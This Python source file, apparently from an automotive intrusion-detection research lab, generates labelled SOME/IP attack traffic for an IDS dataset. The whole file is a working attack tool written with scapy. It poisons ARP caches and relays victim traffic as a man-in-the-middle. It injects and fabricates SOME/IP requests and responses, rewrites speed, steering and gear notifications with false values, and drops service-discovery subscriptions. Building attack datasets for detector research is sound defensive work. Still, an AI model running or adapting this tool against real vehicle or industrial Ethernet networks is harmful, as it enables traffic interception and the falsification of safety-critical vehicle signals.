#!/usr/bin/env python3
"""attacker.py -- ARP spoofing, relay MITM em userspace e injecao SOME/IP.

Corre no ecu6 (imagem "attacker" do Dockerfile: base + python3-scapy) e e'
invocado pelo scripts/gen_attack_dataset.sh com os switches do padrao de ataque
a gerar (ver docs/attack_datasets.md, Fase 3).

Modelo (topologia da Fig. 4 do artigo, lab someip-ids):

  --poison VICTIM:CLAIMED     envenena a ARP de VICTIM (CLAIMED esta em
                              ATTACKER-MAC) e relaya o trafego VICTIM<->real(CLAIMED)
                              em userspace (ip_forward=0 no ecu6). MACs reais sao
                              resolvidos ANTES do envenenamento.

  Politicas de relay (todas sobre os frames cujo dst MAC e' o do atacante):
    --terminate-requests F    intercepta fraccao F dos ECHO requests (0x1234/
                              0x0001, udp/30509); com --inject-requests o
                              atacante envia um request proprio (client id
                              0x1002) ao servidor e SEMPRE fabrica a response
                              ao cliente (request-id original). [Fig. 2a]
    --terminate-responses F   intercepta fraccao F das responses RR e fabrica
                              substituto ao cliente (wiretap; Fig. 3a).
    --req-style knows|ignores payload do request injetado: copia o do cliente
                              (sabe o padrao) ou usa contador proprio.
    --fab-style knows|ignores payload da response fabricada: clone do real ou
                              valores plausiveis que violam o padrao.
    --tamper-notify F         reescreve fraccao F das notificacoes NE
                              (svc --tamper-svc, msgtype 0x02) com um valor de
                              --tamper-signal violando a faixa (--tamper-kind
                              violating) ou quebrando o padrao de variacao
                              (plausible); pacote adulterado sai com o MAC do
                              atacante (label 1), o original nao e' reenviado.
                              [Fig. 1a]
    --drop-sd-subscribe SVC   descarta SubscribeEventgroup SOME/IP-SD do
                              cliente para SVC (corta o subscribe ao servidor
                              real). [Fig. 1b]

Label (regra de geracao): pacotes com src MAC = MAC do atacante = 1.
Frames apenas encaminhados mantem o src MAC original = 0.

Saida: log em stdout; ao terminar imprime uma linha "ATTACKER_STATS:{json}".
"""

import argparse
import json
import random
import signal
import sys
import threading
import time

from scapy.all import ARP, Ether, IP, UDP, Raw, conf, get_if_hwaddr, sniff

SD_PORT = 30490
RR_PORT = 30509
NEPC_PORT = 30510
NEC_PORT = 30511
SVC_RR = 0x1234
SVC_NEPC = 0x1235
SVC_NEC = 0x1236
METH_ECHO = 0x0001
SD_ENTRY_SUBSCRIBE = 0x06
MT_REQUEST = 0x00
MT_RESPONSE = 0x80
MT_NOTIFICATION = 0x02
PROTO_VER = 0x01
IFACE_VER = 0x00
ATTACKER_CLIENT_ID = 0x1002
ATTACKER_SPORT = 46891
POISON_INTERVAL = 1.5

SIGNAL_OFFSETS = {
    "speed": (0, 2),
    "steering": (2, 4),
    "gear": (4, 5),
}


def log(msg):
    print(f"[attacker] {msg}", flush=True)


class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.counters = {}

    def inc(self, key, n=1):
        with self._lock:
            self.counters[key] = self.counters.get(key, 0) + n

    def snapshot(self):
        with self._lock:
            return dict(self.counters)


def parse_args():
    p = argparse.ArgumentParser(description="SOME/IP attacker (ecu6)")
    p.add_argument("--iface", default="eth0")
    p.add_argument("--poison", action="append", default=[], metavar="VICTIM:CLAIMED")
    p.add_argument("--terminate-requests", type=float, default=0.0)
    p.add_argument("--terminate-responses", type=float, default=0.0)
    p.add_argument("--inject-requests", action="store_true")
    p.add_argument("--req-style", choices=["knows", "ignores"], default="knows")
    p.add_argument("--fab-style", choices=["knows", "ignores"], default="knows")
    p.add_argument("--tamper-notify", type=float, default=0.0)
    p.add_argument("--tamper-svc", default="0x1235,0x1236")
    p.add_argument("--tamper-signal", choices=["speed", "steering", "gear", "mixed"],
                   default="mixed")
    p.add_argument("--tamper-kind", choices=["violating", "plausible", "mixed"],
                   default="mixed")
    p.add_argument("--drop-sd-subscribe", action="append", default=[], metavar="SVC")
    p.add_argument("--duration", type=float, default=0.0, metavar="S")
    p.add_argument("--stats-file", default="")
    p.add_argument("--seed", type=int, default=None)
    return p.parse_args()


def parse_someip(data):
    if len(data) < 16:
        return None
    return {
        "svc": int.from_bytes(data[0:2], "big"),
        "mtd": int.from_bytes(data[2:4], "big"),
        "len": int.from_bytes(data[4:8], "big"),
        "client": int.from_bytes(data[8:10], "big"),
        "session": int.from_bytes(data[10:12], "big"),
        "proto": data[12],
        "iface": data[13],
        "mtype": data[14],
        "rc": data[15],
        "payload": data[16:],
    }


def someip_bytes(svc, mtd, req_client, req_session, mtype, rc, payload, length=None):
    ln = length if length is not None else 4 + 4 + len(payload)
    return (
        svc.to_bytes(2, "big")
        + mtd.to_bytes(2, "big")
        + ln.to_bytes(4, "big")
        + req_client.to_bytes(2, "big")
        + req_session.to_bytes(2, "big")
        + bytes([PROTO_VER, IFACE_VER, mtype, rc])
        + payload
    )


def sd_subscribed_services(data):
    hdr = parse_someip(data)
    if hdr is None or hdr["svc"] != 0xFFFF:
        return set()
    body = hdr["payload"]
    if len(body) < 8:
        return set()
    entry_len = int.from_bytes(body[4:8], "big")
    entries = body[8:8 + entry_len]
    out = set()
    for i in range(0, len(entries) - 15, 16):
        e = entries[i:i + 16]
        if e[0] == SD_ENTRY_SUBSCRIBE:
            out.add(int.from_bytes(e[4:6], "big"))
    return out


class Attacker:
    def __init__(self, args):
        self.args = args
        self.iface = args.iface
        self.attacker_mac = get_if_hwaddr(self.iface).lower()
        self.stats = Stats()
        self.rng = random.Random(args.seed)
        self.running = True
        self.pairs = {}
        for spec in args.poison:
            victim, claimed = spec.split(":", 1)
            self.pairs[victim] = claimed
        self.real_mac = {}
        self._l2sock = None
        self.drop_svcs = {int(s, 16) for s in args.drop_sd_subscribe}
        self.tamper_svcs = {int(s, 16) for s in args.tamper_svc.split(",") if s}
        self.tracked_mode = 0
        self.attacker_session = 0
        self.attacker_ip = self._local_ip()
        self.attacker_mac_raw = bytes.fromhex(self.attacker_mac.replace(":", ""))

    def _local_ip(self):
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("192.168.2.4", 30509))
            return s.getsockname()[0]
        finally:
            s.close()

    def log(self, msg):
        log(msg)

    def learn_macs(self):
        from scapy.all import srp
        targets = set(self.pairs) | set(self.pairs.values())
        for ip in sorted(targets):
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                # timeout curto: o poison so comeca depois de learn_macs;
                # 2s x 2 IPs deixava ~4s de trafego a fugir ao MITM.
                iface=self.iface, timeout=0.5, verbose=0,
            )
            if not ans:
                raise RuntimeError(f"nao resolvi MAC de {ip}")
            self.real_mac[ip] = ans[0][1].src.lower()
        for ip, mac in sorted(self.real_mac.items()):
            self.log(f"mac {ip} = {mac}")

    def deliver_mac(self, ip):
        return self.real_mac.get(ip)

    def route_mac(self, src_ip):
        claimed = self.pairs.get(src_ip)
        if claimed is None:
            return None
        return self.real_mac.get(claimed)

    def send(self, pkt):
        # sendp abre um socket por pacote (lentissimo; o prn do sniff fica
        # atrasado e o SO_RCVBUF enche -> drops). Socket L2 persistente.
        sock = self._l2sock
        if sock is None:
            sock = conf.L2socket(iface=self.iface)
            self._l2sock = sock
        sock.send(pkt)

    def poison_once(self):
        for victim, claimed in self.pairs.items():
            self.send(
                Ether(dst=self.real_mac[victim])
                / ARP(
                    op=2, psrc=claimed, hwsrc=self.attacker_mac,
                    pdst=victim, hwdst=self.real_mac[victim],
                )
            )
            self.stats.inc("poison_sent")

    def poison_loop(self):
        while self.running:
            self.poison_once()
            t0 = time.time()
            while self.running and time.time() - t0 < POISON_INTERVAL:
                time.sleep(0.1)

    def arp_reply(self, pkt, ip):
        self.send(
            Ether(dst=pkt[ARP].hwsrc)
            / ARP(
                op=2, psrc=ip, hwsrc=self.attacker_mac,
                pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc,
            )
        )
        self.stats.inc("arp_reply")

    def tracked_next_session(self):
        self.attacker_session += 1
        if self.attacker_session > 0xFFFF:
            self.attacker_session = 1
        return self.attacker_session

    def handle(self, pkt):
        try:
            self._handle(pkt)
        except Exception as exc:
            import traceback
            self.stats.inc("handle_error")
            log(f"ERRO no handle: {exc.__class__.__name__}: {exc}")
            traceback.print_exc(file=sys.stdout)
            sys.stdout.flush()

    def _handle(self, pkt):
        if ARP in pkt:
            if pkt[ARP].op == 1 and pkt[ARP].pdst in set(self.pairs.values()):
                if pkt[ARP].pdst != self.attacker_ip:
                    self.arp_reply(pkt, pkt[ARP].pdst)
            return
        if Ether not in pkt or pkt[Ether].dst.lower() != self.attacker_mac:
            return
        if IP not in pkt:
            return
        ip = pkt[IP]
        if ip.dst == self.attacker_ip:
            return
        if UDP not in pkt:
            self.forward(pkt)
            return
        udp = pkt[UDP]
        data = bytes(udp.payload)
        hdr = parse_someip(data) if data else None

        if udp.sport == SD_PORT and udp.dport == SD_PORT and hdr:
            if self.drop_svcs:
                subs = sd_subscribed_services(data)
                hit = subs & self.drop_svcs
                if hit:
                    self.stats.inc("sd_subscribe_drop")
                    return
            self.forward(pkt)
            return

        if hdr and hdr["mtype"] == MT_REQUEST and hdr["svc"] == SVC_RR \
                and hdr["mtd"] == METH_ECHO and udp.dport == RR_PORT:
            if self.args.terminate_requests > 0 \
                    and self.rng.random() < self.args.terminate_requests:
                self.terminate_request(pkt, ip, udp, hdr)
                return
            self.forward(pkt)
            return

        if hdr and hdr["mtype"] == MT_RESPONSE and hdr["svc"] == SVC_RR \
                and udp.sport == RR_PORT:
            self._track_mode(hdr)
            if self.args.terminate_responses > 0 \
                    and self.rng.random() < self.args.terminate_responses:
                self.fabricate_response(pkt, ip, udp, hdr)
                return
            self.forward(pkt)
            return

        if hdr and hdr["mtype"] == MT_NOTIFICATION and hdr["svc"] in self.tamper_svcs:
            if self.args.tamper_notify > 0 \
                    and self.rng.random() < self.args.tamper_notify:
                self.tamper_notification(pkt, ip, udp, hdr)
                return
            self.forward(pkt)
            return

        if hdr and hdr["mtype"] == MT_REQUEST and hdr["mtd"] in (0x0002, 0x0003) \
                and hdr["payload"]:
            self._track_mode_from_setmode(hdr)
            self.forward(pkt)
            return

        self.forward(pkt)

    def forward(self, pkt):
        ip = pkt[IP]
        dst = self.deliver_mac(ip.dst)
        if dst is None:
            dst = self.route_mac(ip.src)
        if dst is None:
            self.stats.inc("drop_no_route")
            return
        pkt[Ether].dst = dst
        # checksums UDP/IP do sniffer vêm como parcial (offload do veth) e o
        # scapy mantem-nos invalidos ao reemitir; forcar recalculo.
        pkt[IP].chksum = None
        if UDP in pkt:
            pkt[UDP].chksum = None
        self.send(pkt)
        self.stats.inc("forward")

    def _track_mode(self, hdr):
        if len(hdr["payload"]) >= 2:
            self.tracked_mode = hdr["payload"][1] & 0x03

    def _track_mode_from_setmode(self, hdr):
        self.tracked_mode = hdr["payload"][0] & 0x03

    def terminate_request(self, pkt, ip, udp, hdr):
        self.stats.inc("terminate_request")
        if self.args.inject_requests:
            self.inject_request(ip, udp, hdr)
        self.respond_to_client(ip, udp, hdr)

    def inject_request(self, ip, udp, hdr):
        if self.args.req_style == "knows":
            payload = bytes(hdr["payload"])
        else:
            payload = (self.rng.getrandbits(32).to_bytes(4, "big")
                       + bytes([0x11] * 12))
        body = someip_bytes(
            hdr["svc"], hdr["mtd"], ATTACKER_CLIENT_ID,
            self.tracked_next_session(), MT_REQUEST, 0x00, payload,
        )
        out = (
            Ether(src=self.attacker_mac, dst=self.route_mac(ip.src))
            / IP(src=self.attacker_ip, dst=ip.dst, id=self.rng.randint(1, 0xFFFF))
            / UDP(sport=ATTACKER_SPORT, dport=udp.dport)
            / Raw(load=body)
        )
        self.send(out)
        self.stats.inc("inject_request")

    def respond_to_client(self, ip, udp, hdr):
        req0 = hdr["payload"][0] if hdr["payload"] else 0
        if self.args.fab_style == "knows":
            payload = bytes([req0, self.tracked_mode & 0x03, 0x22, 0x22])
        else:
            payload = bytes([req0, 0x00, 0x33, 0x33])
        body = someip_bytes(
            hdr["svc"], hdr["mtd"], hdr["client"], hdr["session"],
            MT_RESPONSE, 0x00, payload,
        )
        out = (
            Ether(src=self.attacker_mac, dst=self.real_mac[ip.src])
            / IP(src=ip.dst, dst=ip.src, id=self.rng.randint(1, 0xFFFF))
            / UDP(sport=udp.dport, dport=udp.sport)
            / Raw(load=body)
        )
        self.send(out)
        self.stats.inc("fab_resp_client")

    def fabricate_response(self, pkt, ip, udp, hdr):
        payload = bytes(hdr["payload"])
        if self.args.fab_style == "ignores" and len(payload) >= 4:
            payload = payload[:2] + b"\x33\x33"
        body = someip_bytes(
            hdr["svc"], hdr["mtd"], hdr["client"], hdr["session"],
            MT_RESPONSE, hdr["rc"], payload,
        )
        out = (
            Ether(src=self.attacker_mac, dst=self.real_mac[ip.dst])
            / IP(src=ip.src, dst=ip.dst, id=self.rng.randint(1, 0xFFFF))
            / UDP(sport=udp.sport, dport=udp.dport)
            / Raw(load=body)
        )
        self.send(out)
        self.stats.inc("fab_resp_server")

    def tamper_payload(self, data):
        kind = self.args.tamper_kind
        if kind == "mixed":
            kind = self.rng.choice(["violating", "plausible"])
        signal = self.args.tamper_signal
        if signal == "mixed":
            signal = self.rng.choice(["speed", "steering", "gear"])
        buf = bytearray(data)
        if signal == "speed":
            cur = int.from_bytes(buf[0:2], "big")
            if kind == "violating":
                new = 60000
            else:
                new = max(0, min(65535, cur + self.rng.choice([-5500, 5500])))
            buf[0:2] = new.to_bytes(2, "big")
        elif signal == "steering":
            cur = int.from_bytes(buf[2:4], "big", signed=True)
            if kind == "violating":
                new = 25000 if cur >= 0 else -25000
            else:
                new = max(-2000, min(2000, cur + self.rng.choice([-1900, 1900])))
            buf[2:4] = int(new).to_bytes(2, "big", signed=True)
        else:
            cur = buf[4]
            if kind == "violating":
                new = 7
            else:
                choices = [g for g in range(1, 7) if g != cur]
                new = self.rng.choice(choices)
            buf[4] = new
        return bytes(buf)

    def tamper_notification(self, pkt, ip, udp, hdr):
        payload = self.tamper_payload(hdr["payload"])
        body = someip_bytes(
            hdr["svc"], hdr["mtd"], hdr["client"], hdr["session"],
            MT_NOTIFICATION, hdr["rc"], payload,
        )
        out = (
            Ether(src=self.attacker_mac, dst=self.real_mac[ip.dst])
            / IP(src=ip.src, dst=ip.dst, id=self.rng.randint(1, 0xFFFF))
            / UDP(sport=udp.sport, dport=udp.dport)
            / Raw(load=body)
        )
        self.send(out)
        self.stats.inc("tamper_notify")

    def run(self):
        self.learn_macs()
        threads = []
        if self.pairs:
            t = threading.Thread(target=self.poison_loop, daemon=True)
            t.start()
            threads.append(t)
            self.log(f"poison ativo: {self.pairs}")

        signal.signal(signal.SIGTERM, lambda *_: self.stop())
        signal.signal(signal.SIGINT, lambda *_: self.stop())

        t0 = time.time()
        log(f"relay/attacker a servir em {self.iface} "
            f"(mac={self.attacker_mac} ip={self.attacker_ip})")

        def stop_sniff(*_):
            pass

        sniff_kwargs = dict(
            iface=self.iface, filter="arp or ip", prn=self.handle,
            store=False, stop_filter=lambda _: not self.running,
        )
        if self.args.duration > 0:
            sniff_kwargs["timeout"] = self.args.duration

        sniffer = threading.Thread(
            target=lambda: sniff(**sniff_kwargs), daemon=True
        )
        sniffer.start()
        threads.append(sniffer)

        next_stats = t0 + 5.0
        while self.running:
            if self.args.duration > 0 and time.time() - t0 >= self.args.duration:
                self.stop()
                break
            if time.time() >= next_stats:
                log("stats: " + json.dumps(self.stats.snapshot(), sort_keys=True))
                next_stats = time.time() + 5.0
            time.sleep(0.2)
        sniffer.join(timeout=5)
        return self.report()

    def stop(self):
        self.running = False

    def report(self):
        stats = self.stats.snapshot()
        line = "ATTACKER_STATS:" + json.dumps(stats, sort_keys=True)
        print(line, flush=True)
        if self.args.stats_file:
            with open(self.args.stats_file, "w") as f:
                json.dump(stats, f, indent=2, sort_keys=True)
        return stats


def main():
    args = parse_args()
    att = Attacker(args)
    try:
        att.run()
    except Exception as exc:
        print(f"[attacker] ERRO: {exc}", file=sys.stderr, flush=True)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
